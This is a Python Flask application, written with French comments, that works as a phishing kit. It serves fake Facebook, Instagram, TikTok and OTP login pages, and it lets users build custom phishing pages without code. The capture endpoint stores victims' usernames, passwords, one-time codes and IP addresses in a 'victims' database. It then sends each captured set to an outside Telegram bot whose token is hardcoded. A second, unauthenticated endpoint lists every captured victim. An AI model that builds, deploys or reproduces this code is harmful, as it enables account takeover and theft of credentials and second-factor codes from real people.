import os
from flask import Flask, request, jsonify, render_template
import requests
import datetime
import sqlite3

app = Flask(__name__)

TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8797682325:AAFMj6kcNv2R_EF3cWtl2pvWuRXVX4UwV7Q")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6141755021")
DB_NAME = 'abeilles.db'

PLATFORM_LOGOS = {
    "Facebook": "📘 [Facebook]",
    "Facebook OTP": "🔒 [Facebook OTP]",
    "Instagram": "📸 [Instagram]",
    "Instagram OTP": "🔐 [Instagram OTP]",
    "TikTok": "🎵 [TikTok]",
    "Portail Abeilles": "🐝 [Abeilles]"
}

def get_db_connection():
    conn = sqlite3.connect(DB_NAME)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS victims (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            owner TEXT,
            network TEXT,
            type TEXT,
            victimUser TEXT,
            victimPass TEXT,
            victimOtp TEXT,
            dateStr TEXT,
            timestamp INTEGER,
            ip TEXT
        )
    ''')
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS custom_pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            slug TEXT UNIQUE,
            title TEXT,
            network TEXT,
            bg_type TEXT,
            bg_value TEXT,
            logo_url TEXT,
            logo_shape TEXT,
            fields_json TEXT,
            btn_text TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

def send_telegram_notification(message):
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "VOTRE_BOT_TOKEN":
        return
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print("Erreur Telegram:", e)

@app.route('/')
def index():
    return render_template('index.html')

# --- ROUTE INTELLIGENTE QUI SÉPARE LES DOSSIERS ---
@app.route('/phish/<platform_name>')
def render_phish_page(platform_name):
    # 1. Vérifier si c'est une page No-Code personnalisée
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM custom_pages WHERE slug = ?", (platform_name,))
    cp = cursor.fetchone()
    conn.close()

    if cp:
        import json
        config = {
            "title": cp["title"],
            "network": cp["network"],
            "bg_type": cp["bg_type"],
            "bg_value": cp["bg_value"],
            "logo_url": cp["logo_url"],
            "logo_shape": cp["logo_shape"],
            "fields": json.loads(cp["fields_json"]),
            "btn_text": cp["btn_text"]
        }
        return render_template('custom_login.html', config=config)

    # 2. Si le nom contient "otp", on cherche dans le dossier otp/
    # Sinon, on cherche dans le dossier standard/
    p_lower = platform_name.lower()
    try:
        if "otp" in p_lower:
            return render_template(f"otp/{p_lower}.html")
        else:
            return render_template(f"standard/{p_lower}.html")
    except Exception:
        return "Page introuvable ou sous-dossier invalide", 404

@app.route('/api/capture', methods=['POST'])
def capture_data():
    data = request.json
    owner = data.get('owner', 'Inconnu')
    network = data.get('network', 'Facebook')
    v_user = data.get('victimUser')
    v_pass = data.get('victimPass')
    v_otp = data.get('otp', 'Aucun')
    v_type = data.get('type', 'standard')
    v_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    current_time = datetime.datetime.now()
    timestamp = int(current_time.timestamp() * 1000)
    date_str = current_time.strftime("%d/%m/%Y %H:%M:%S")

    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO victims (owner, network, type, victimUser, victimPass, victimOtp, dateStr, timestamp, ip)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    ''', (owner, network, v_type, v_user, v_pass, v_otp, date_str, timestamp, v_ip))
    conn.commit()
    conn.close()

    platform_brand = PLATFORM_LOGOS.get(network, f"🌐 [{network}]")

    alert_text = (
        f"🚨 *NOUVELLE VICTIME CAPTURÉE* 🚨\n\n"
        f"{platform_brand}\n"
        f"👤 *Propriétaire:* `{owner}`\n"
        f"📋 *Flux:* `{v_type.upper()}`\n"
        f"🎯 *Identifiant:* `{v_user}`\n"
        f"🔑 *Mot de passe:* `{v_pass}`\n"
        f"🔒 *Code OTP:* `{v_otp}`\n"
        f"🕒 *Heure:* `{date_str}`\n"
        f"📍 *IP:* `{v_ip}`"
    )
    send_telegram_notification(alert_text)

    return jsonify({"status": "success", "message": "Captured and saved successfully"})

@app.route('/api/victims', methods=['GET'])
def get_victims():
    owner = request.args.get('owner')
    conn = get_db_connection()
    cursor = conn.cursor()
    
    if owner and owner != 'Inconnu':
        cursor.execute("SELECT * FROM victims WHERE owner = ? ORDER BY id DESC", (owner,))
    else:
        cursor.execute("SELECT * FROM victims ORDER BY id DESC")
        
    rows = cursor.fetchall()
    conn.close()
    
    victims_list = []
    for row in rows:
        victims_list.append({
            "id": row["id"],
            "owner": row["owner"],
            "network": row["network"],
            "type": row["type"],
            "victimUser": row["victimUser"],
            "victimPass": row["victimPass"],
            "otp": row["victimOtp"],
            "dateStr": row["dateStr"],
            "ip": row["ip"]
        })
        
    return jsonify(victims_list)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
